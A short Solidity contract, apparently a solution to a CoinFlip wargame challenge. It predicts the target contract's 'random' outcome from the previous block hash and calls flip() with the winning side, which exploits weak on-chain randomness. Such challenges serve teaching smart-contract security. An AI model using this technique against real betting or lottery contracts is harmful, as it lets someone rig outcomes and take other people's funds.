// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Task.sol";

contract CoinFlipCracker {
  
  CoinFlip coinflip;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _coinflip) {
    coinflip = CoinFlip(_coinflip);
  }

  function getSide() internal view returns (bool side) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    side = coinFlip == 1 ? true : false;

  }

  function winCoinFlip() public {
    bool side = getSide();
    coinflip.flip(side);
  }
}


